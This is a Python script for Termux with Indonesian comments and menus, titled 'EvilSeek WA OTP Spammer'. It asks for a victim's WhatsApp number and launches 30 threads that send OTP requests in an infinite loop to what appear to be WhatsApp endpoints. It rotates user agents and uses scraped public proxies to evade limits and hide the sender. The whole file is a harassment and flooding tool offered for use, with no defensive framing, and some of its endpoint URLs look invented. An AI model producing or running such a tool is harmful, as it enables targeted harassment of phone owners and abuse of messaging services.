#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-
# EvilSeek WA OTP Spammer - Infinite Loop + Menu
# Jalankan: chmod +x wa_evilspam.py && ./wa_evilspam.py

import requests
import threading
import time
import random
import sys
import os
from colorama import Fore, Style, init

init(autoreset=True)

# ========== BANNER OREN (sesuai permintaan) ==========
BANNER = f"""
{Fore.LIGHTYELLOW_EX}1010
0110
1010
0110
1010  SPAMMER
0110
10001010101
01010100010
{Style.RESET_ALL}"""

# ========== KONFIGURASI ==========
ENDPOINTS = [
    "https://api.whatsapp.com/sendcode",
    "https://web.whatsapp.com/otp/request",
    "https://api.whatsapp.net/v1/phone/request_code"
]
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/110.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
]
THREADS = 30          # jumlah parallel request
DELAY_MIN = 0.2
DELAY_MAX = 1.0
PROXY_ENABLED = True  # set False kalau mau tanpa proxy

# ========== PROXY SCRAPER ==========
def scrape_proxies():
    """Ambil proxy publik dari API"""
    try:
        url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all"
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200:
            raw = resp.text.strip().split('\r\n')
            proxies = [{"http": f"http://{p}", "https": f"http://{p}"} for p in raw if p and ":" in p]
            print(Fore.CYAN + f"[+] {len(proxies)} proxy siap digunakan")
            return proxies
        return []
    except Exception as e:
        print(Fore.RED + f"[!] Gagal ambil proxy: {str(e)[:30]}")
        return []

PROXY_POOL = scrape_proxies() if PROXY_ENABLED else []

# ========== FUNGSI KIRIM OTP ==========
def send_otp(phone, proxy=None):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {
        "phone": phone,
        "country_code": phone[:3] if phone.startswith("+") else "62"
    }
    url = random.choice(ENDPOINTS)
    try:
        resp = requests.post(url, data=data, headers=headers, proxies=proxy, timeout=8)
        if resp.status_code in [200, 201, 202, 204]:
            print(Fore.GREEN + f"[✓] OTP terkirim | {url.split('/')[-1]}")
        else:
            print(Fore.YELLOW + f"[•] {resp.status_code} | {resp.text[:40]}")
    except Exception as e:
        print(Fore.RED + f"[✗] gagal: {str(e)[:20]}")

def worker(phone, total=0):
    """Worker: kirim OTP selamanya (infinite)"""
    count = 0
    while True:
        proxy = random.choice(PROXY_POOL) if PROXY_POOL and PROXY_ENABLED else None
        send_otp(phone, proxy)
        count += 1
        delay = random.uniform(DELAY_MIN, DELAY_MAX)
        time.sleep(delay)

# ========== MENU UTAMA ==========
def clear_screen():
    os.system('clear') if os.name == 'posix' else os.system('cls')

def main():
    while True:
        clear_screen()
        print(BANNER)
        print(Fore.LIGHTYELLOW_EX + "[1] SPAM OTP INFINITE LOOP <nomer WA>")
        print(Fore.LIGHTYELLOW_EX + "[2] EXIT")
        print(Fore.CYAN + "="*40)
        pilihan = input(Fore.CYAN + "Pilih (1/2): ").strip()

        if pilihan == "1":
            phone = input(Fore.CYAN + "Masukkan nomor WA (contoh: +6281234567890): ").strip()
            if not phone:
                print(Fore.RED + "Nomor kosong! Kembali ke menu.")
                time.sleep(1)
                continue
            # Validasi sederhana
            if not phone.startswith("+"):
                print(Fore.YELLOW + "[!] Disarankan pakai +62... (kode negara)")
            print(Fore.GREEN + f"\n[!] MULAI SPAM INFINITE KE {phone} | Tekan Ctrl+C untuk berhenti\n")
            print(Fore.CYAN + f"[+] Thread aktif: {THREADS} | Delay: {DELAY_MIN}-{DELAY_MAX}s")
            
            threads = []
            for i in range(THREADS):
                t = threading.Thread(target=worker, args=(phone,), daemon=True)
                t.start()
                threads.append(t)
            
            try:
                # Tunggu sampai interupsi
                while True:
                    time.sleep(5)
                    # Tampilkan status tiap 5 detik (opsional)
                    print(Fore.MAGENTA + f"[~] {threading.active_count()-1} thread berjalan...")
            except KeyboardInterrupt:
                print(Fore.MAGENTA + "\n[!] SPAM DIHENTIKAN. Kembali ke menu.")
                # Thread daemon mati otomatis, tapi kita tunggu sebentar
                time.sleep(1)
                continue

        elif pilihan == "2":
            print(Fore.RED + "Exiting EvilSeek. Selamat bertahan di Aquarius-5.")
            sys.exit(0)
        else:
            print(Fore.RED + "Pilihan tidak valid.")
            time.sleep(1)

if __name__ == "__main__":
    main()